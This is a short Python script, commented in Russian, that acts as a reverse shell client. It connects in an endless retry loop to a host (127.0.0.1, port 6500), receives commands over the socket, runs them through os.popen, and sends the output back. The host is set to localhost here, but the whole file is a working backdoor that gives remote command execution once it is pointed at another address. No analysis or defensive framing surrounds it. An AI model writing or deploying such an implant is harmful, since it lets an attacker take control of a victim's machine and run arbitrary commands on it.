import socket
import os


def ExecuteCommand(command):
    try:
        output = os.popen(command).read()
        return output
    except:
        return ''


def main():
    host = "127.0.0.1"  # ip который будем использовать
    port = 6500  # порт
    while True:
        while True:
            try:
                s = socket.socket()  # создаем сокет
                s.connect((host, port))  # подключаемся
            except:
                continue

            while True:
                try:
                    data = s.recv(1024).decode()  # получаем команду
                    output = ExecuteCommand(str(data))
                    if len(output) == 0:
                        s.send(" ".encode())  # в случае, если рзультат
                        # пустой, отправляем пробел
                    else:
                        s.send(output.encode())  # отправляем результат
                except:
                    break
    os.close()


if __name__ == '__main__':
    main()
